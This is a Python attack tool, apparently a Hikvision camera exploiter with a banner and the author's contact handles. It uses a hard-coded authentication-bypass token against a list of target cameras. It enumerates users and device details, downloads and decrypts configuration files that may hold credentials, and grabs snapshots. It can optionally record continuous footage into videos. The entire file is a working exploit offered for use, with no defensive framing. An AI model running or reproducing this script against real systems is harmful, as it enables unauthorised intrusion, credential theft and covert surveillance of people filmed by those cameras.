import requests
import os
import time
from datetime import datetime, timedelta
import subprocess
import signal
from concurrent.futures import ThreadPoolExecutor
import xml.etree.ElementTree as ET

# Directory path to check
directory_path = "/onvif-http/snapshot?auth=YWRtaW46MTEK"

# Paths for additional information
device_info_path = "/System/deviceInfo?auth=YWRtaW46MTEK"
user_info_path = "/Security/users?auth=YWRtaW46MTEK"
config_file_path = "/System/configurationFile?auth=YWRtaW46MTEK"  # Ensure this is defined

# Create directories to save snapshots and videos
os.makedirs("snapshots", exist_ok=True)
os.makedirs("records", exist_ok=True)

# ANSI color codes
class Color:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"

# Global flag to handle interrupt
interrupted = False

# Function to print the banner
def print_banner():
    banner = f"""
{Color.GREEN}
============================================================
██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗██████╗
██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   █████╗  ██████╔╝
██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

Contact me on:
Instagram : @hex_buddy
Telegram : @HexBuddy127001
============================================================
{Color.RESET}
"""
    print(banner)

# Function to read targets from targets.txt
def read_targets(file_path):
    try:
        with open(file_path, 'r') as file:
            targets = [line.strip() for line in file if line.strip()]
        return targets
    except FileNotFoundError:
        print(f"{Color.RED}[-] Error: {file_path} not found!{Color.RESET}")
        return []

# Function to check if a directory is accessible
def check_directory(ip_port):
    url = f"http://{ip_port}{directory_path}"
    try:
        response = requests.head(url, timeout=10)
        if response.status_code == 200:
            print(f"{Color.GREEN}[+] Directory is accessible: {url}{Color.RESET}")
            return url
    except Exception as e:
        print(f"{Color.RED}[-] Error checking directory: {e} ({url}){Color.RESET}")
    return None

# Function to fetch and parse XML data
def fetch_xml_data(url):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return ET.fromstring(response.content)
        else:
            print(f"{Color.YELLOW}[-] Failed to retrieve XML data from {url}{Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}[-] Error fetching XML data: {e} ({url}){Color.RESET}")
    return None

# Function to print device information
def print_device_info(ip_port):
    url = f"http://{ip_port}{device_info_path}"
    xml_data = fetch_xml_data(url)
    if xml_data is not None:
        print(f"{Color.BLUE}[+] Device information for {ip_port}:{Color.RESET}")
        for child in xml_data:
            print(f"{Color.GREEN}{child.tag.split('}')[-1].replace('device', 'Device ')}: {child.text}{Color.RESET}")

# Function to print user information
def print_user_info(ip_port):
    url = f"http://{ip_port}{user_info_path}"
    xml_data = fetch_xml_data(url)
    if xml_data is not None:
        print(f"{Color.BLUE}[+] Users and roles for {ip_port}:{Color.RESET}")
        for user in xml_data:
            username_element = user.find('.//{http://www.hikvision.com/ver10/XMLSchema}userName')
            user_level_element = user.find('.//{http://www.hikvision.com/ver10/XMLSchema}userLevel')

            if username_element is not None and user_level_element is not None:
                username = username_element.text
                user_level = user_level_element.text
                print(f"{Color.GREEN}{username}: {user_level}{Color.RESET}")
            else:
                print(f"{Color.YELLOW}[-] User or user level information not found for {ip_port}{Color.RESET}")

# Function to download a single snapshot
def download_single_snapshot(url, folder):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            filename = os.path.join(folder, "0000.jpg")
            with open(filename, 'wb') as f:
                f.write(response.content)
            print(f"{Color.BLUE}[+] Snapshot saved: {filename}{Color.RESET}")
        else:
            print(f"{Color.YELLOW}[-] Failed to download snapshot from {url}{Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}[-] Error downloading snapshot: {e} ({url}){Color.RESET}")

# Function to download snapshots continuously
def download_snapshots_continuous(url, folder):
    while not interrupted:
        download_single_snapshot(url, folder)
        time.sleep(5)  # Adjust the interval as needed

# Function to create a video from snapshots
def create_video(folder, output_folder):
    try:
        output_filename = os.path.join(output_folder, f"{os.path.basename(folder)}.mp4")
        # Use ffmpeg or another tool to create video from images in 'folder'
        # Example command: ffmpeg -framerate 1/5 -pattern_type glob -i '*.jpg' output.mp4
        # Replace this with your actual command
        command = f"ffmpeg -framerate 1/5 -pattern_type glob -i '{os.path.join(folder, '*.jpg')}' {output_filename}"
        subprocess.run(command, shell=True, check=True)
        print(f"{Color.BLUE}[+] Video created: {output_filename}{Color.RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{Color.RED}[-] Error creating video: {e}{Color.RESET}")

# Function to handle SIGINT (Ctrl+C)
def handle_sigint(sig, frame):
    global interrupted
    interrupted = True
    print(f"{Color.YELLOW}\n[!] Ctrl+C detected. Exiting gracefully...{Color.RESET}")

# Function to fetch and decrypt configuration file
def fetch_and_decrypt_config(ip_port, folder):
    url = f"http://{ip_port}{config_file_path}"  # Ensure config_file_path is accessible here
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            config_file = os.path.join(folder, "encrypted_configfile.bin")
            with open(config_file, 'wb') as f:
                f.write(response.content)
            print(f"""{Color.BLUE}[+] Encrypted configuration file saved to: {config_file}{Color.RESET}

[+] This is the Decrypted Content :
""")

            # Decrypt the configuration file using decrypt_configurationFile.py
            try:
                subprocess.run(['python3', 'decrypt_configurationFile.py', config_file], check=True)
            except subprocess.CalledProcessError as e:
                print(f"{Color.RED}[-] Error decrypting configuration file: {e}{Color.RESET}")

        else:
            print(f"{Color.YELLOW}[-] Failed to retrieve configuration file from {url}{Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}[-] Error fetching configuration file: {e} ({url}){Color.RESET}")

# Main function
def main():
    print_banner()
    signal.signal(signal.SIGINT, handle_sigint)
    
    targets = read_targets("targets.txt")
    with ThreadPoolExecutor(max_workers=4) as executor:
        for target in targets:
            ip_port = target.split(",")[0]
            snapshot_url = check_directory(ip_port)
            if snapshot_url:
                folder = os.path.join("snapshots", ip_port.replace(":", "_"))
                os.makedirs(folder, exist_ok=True)
                
                print_user_info(ip_port)
                print_device_info(ip_port)
                fetch_and_decrypt_config(ip_port, folder)
                
                # Download a single snapshot
                executor.submit(download_single_snapshot, snapshot_url, folder)
    
    # Wait for all threads to complete
    executor.shutdown(wait=True)
    
    # Ask the user if they want to create recorded videos
    user_input = input(f"{Color.YELLOW}Do you want to start taking continuous snapshots for creating recorded videos from the cameras? (yes/no): {Color.RESET}")
    if user_input.strip().lower() == "yes":
        with ThreadPoolExecutor(max_workers=4) as executor:
            for target in targets:
                ip_port = target.split(",")[0]
                snapshot_url = check_directory(ip_port)
                if snapshot_url:
                    folder = os.path.join("snapshots", ip_port.replace(":", "_"))
                    executor.submit(download_snapshots_continuous, snapshot_url, folder)
        
        # Wait for all threads to complete
        executor.shutdown(wait=True)
        
        # Create recorded videos from the snapshots
        for folder in os.listdir("snapshots"):
            folder_path = os.path.join("snapshots", folder)
            if os.path.isdir(folder_path):
                create_video(folder_path, "records")

if __name__ == "__main__":
    main()
